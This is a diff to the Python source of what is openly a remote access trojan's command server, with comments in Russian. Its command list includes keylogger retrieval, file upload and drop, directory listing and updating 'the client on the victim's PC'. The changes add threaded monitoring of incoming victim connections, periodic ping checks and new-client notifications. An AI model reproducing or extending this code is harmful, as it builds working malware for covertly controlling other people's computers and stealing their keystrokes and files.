@@ -1,4 +1,17 @@
 import socket, json, base64, time
+import threading
+from time import sleep
+
+
+class Notificator:
+    """Класс, который отвечает за уведомления на внешнем интерфейсе. Нужно наследоваться от этого класса"""
+    def __init__(self) -> None:
+        print("NOTIFICATOR!!!!!!!!!!")
+    def make_notification(text: str, *args):
+        """Принимает текст и дальше может выполнять любую логику.
+           Важно, что может выполняться одновременно, поэтому должн о иметь механизмы защиты"""
+        print(text)
+
 
 # Список команд с описанием, в виде 2д массива
 commands_en = [
@@ -30,7 +43,7 @@ commands = [
     ["clires", "перезапускает скрипт клиента"],
     ["keylogger", "возвращает клавиши собранные кейлогером"],
     ["ping", "показывает задержку в подключении с клиентом"],
-    ["ls", "показывает содержимое папки"]
+    ["ls", "показывает содержимое папки"],
     ["отправить новый файл клиента с комментарием update", "обновляет приложение клиент на пк жертвы"]
 ]
 
@@ -46,30 +59,19 @@ def help_command():
 
 class ManyServers:
     """Класс Сервера, который позволяет оперировать с множеством подключений к клиентам."""
-    def __init__(self):
+# public:
+    def __init__(self, notificator: Notificator =None):
         # import config
         # server = Server(config.SERVER_IP, config.SERVER_PORT)
         # список тегов активных серверов
         self.__servers_count: list[int] = []
         self.__servers_ips = {}
-    
-    def __add_server_to_count(self):
-        i = 0
-        while True:
-            if i not in self.__servers_count:
-                self.__servers_count.append(i)
-                return i
-            i += 1
-    
-    def add_connection(self):
-        """Мониторинг новых подключений, если появляется запрос от нового клиента, принимает его"""
-        import config
-        # принятие запроса на подключение от клиента
-        server = Server(config.SERVER_IP, config.SERVER_PORT)
-        # добавление нового подключения в список всех подключений
-        self.__servers_ips.update({self.__add_server_to_count(): [server.tag, server]})
-        # повторный вызов для бесконечного мониторинга
-        self.add_connection()
+        # менеджер для доставки уведомлений во внешний интерфейс
+        self.notificator: Notificator = notificator if notificator is not None else Notificator()
+        # мониторинг новых запросов на подключение со стороны клиентов
+        threading.Thread(target=self.__connection_monitor, daemon=True).start()
+        # проверка состояния клиентов
+        threading.Thread(target=(self.__connection_checker), daemon=True).start()
     
     def view_all_servers(self):
         """Возвращает список активных подключений"""
@@ -103,6 +105,7 @@ class ManyServers:
                     continue
                 # добавляет в пул возрата результат выпослнения на одном из клиентов
                 res.append(i.step(command.split()[1:]))
+            print("возврат из all", res)
             return res
         try:
             tag = int(tag)
@@ -124,6 +127,35 @@ class ManyServers:
                 res = "соеденение закрыто"
             return res
 
+# private:
+    def __connection_checker(self):
+        """Проверка подключенных клиентов"""
+        while True:
+            self.make_command_to_server("all ping")
+            sleep(5)
+
+    def __add_server_to_count(self):
+        i = 0
+        while True:
+            if i not in self.__servers_count:
+                self.__servers_count.append(i)
+                return i
+            i += 1
+    
+    def __connection_monitor(self):
+        """Мониторинг новых подключений, если появляется запрос от нового клиента, принимает его"""
+        import config
+        # принятие запроса на подключение от клиента
+        server = Server(config.SERVER_IP, config.SERVER_PORT)
+        # добавление нового подключения в список всех подключений
+        self.__servers_ips.update({self.__add_server_to_count(): [server.tag, server]})
+        # уведомление о подключении нового клиента во внешнюю среду
+        text = "подключен новый клиент" + str(server.tag)
+        self.notificator.make_notification(text)
+        # повторный вызов для бесконечного мониторинга
+        self.__connection_monitor()
+    
+
 
 class Server:
 #public:
@@ -141,6 +173,7 @@ class Server:
         
     def step(self, command):
         # command = command.split(" ", 1)
+        self.in_process = True
         try:
             if command[0] in ["upload", "drop", "update_client"]:
                 fileContent = self.__readFile(command[1]).decode()
@@ -157,11 +190,14 @@ class Server:
             elif command[0] == "ratHelp":
                 result = help_command()
             elif command[0] == "ping":
+                self.in_process = False
                 return time.time() - start_ping_time
             elif command[0] == "clires":
+                self.in_process = False
                 return "Клиент отключен -_-"
         except Exception:
             result = "ошибка выполнения команды, проверьте синтаксис"
+        self.in_process = False
         return result
 
 # private:
